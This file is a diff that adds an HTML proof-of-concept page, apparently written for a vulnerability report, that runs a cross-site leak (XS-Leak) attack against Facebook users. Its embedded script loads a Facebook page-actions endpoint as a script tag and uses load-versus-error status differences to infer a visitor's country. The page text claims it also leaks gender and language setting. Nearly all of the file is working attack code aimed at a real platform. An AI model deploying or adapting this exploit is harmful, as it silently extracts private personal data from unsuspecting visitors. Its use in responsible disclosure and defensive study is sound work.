@@ -1,0 +1,68 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Leaking a Facebook user's demographic-based private information through an XSLeaks attack involving different status codes</title>	
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+	<script>
+
+		// By creating more Pages and restricting the visibility only to certain countries it would be possible to leak the location of the user. Other than state/province, and city, this can be improved upon to pinpoint one's location down to their Zipcode.
+		
+		let preparedPages      = ["101859914502836"];
+		let preparedLocations  = ["United States"];
+
+		onload = () => {
+			checkReport(preparedPages.shift(), 0);
+		}
+
+	    checkReport = (id, counter) => {
+	        let script = document.createElement("script");
+	        script.src = `https://www.facebook.com/pages/call_to_action/fetch_dialog_data/?id=${id}&surface=pages_actions_unit`;
+	        script.onload = () => {
+	            showResult(false, counter);
+	        }
+	        script.onerror = () => {
+	        	showResult(true, counter);
+	        }
+	        document.body.appendChild(script);
+	    }
+
+	    showResult = (result, counter) => {
+	    	if (Number(result)) {
+	    		document.getElementById("knownHandler").innerHTML += `User is from ${preparedLocations[counter]}.<br>`;
+	    	} else {
+	    		document.getElementById("knownHandler").innerHTML += `User is not from ${preparedLocations[counter]}.<br>`;
+	    	}
+
+	        if (preparedPages.length != 0) {
+	        	checkReport(preparedPages.shift(), ++counter);
+	        }
+	    }
+	</script>
+</head>
+
+<body>
+    <div class="container">
+	    <section>
+			<div class="row">
+			    <div class="span16">
+			    	<div class="page-header">
+				        <h1>Leaking a Facebook user's demographic-based private info</h1>
+				    </div>
+			        <p><b>There is a script running in the background that will leak:</b></p>
+			        <p>&nbsp;&bull;&nbsp;The location of a user (Country)</p>
+			        <p>&nbsp;&bull;&nbsp;The gender of a user (whether it is set as "Male" or "Female")</p>
+			        <p>&nbsp;&bull;&nbsp;Whether the user's language is set as English</p>
+			        <p><i>(This is only some of the information that can be leaked. The full impact is described in the report)</i></p>
+			    	</br>
+			        <h3 style="color: white;">Automatic result:</h3>
+			        <div id="knownHandler" class="outputStatus"></div>
+					
+			    </div>
+			</div>
+		</section>
+	</div>
+</body>
+</html>
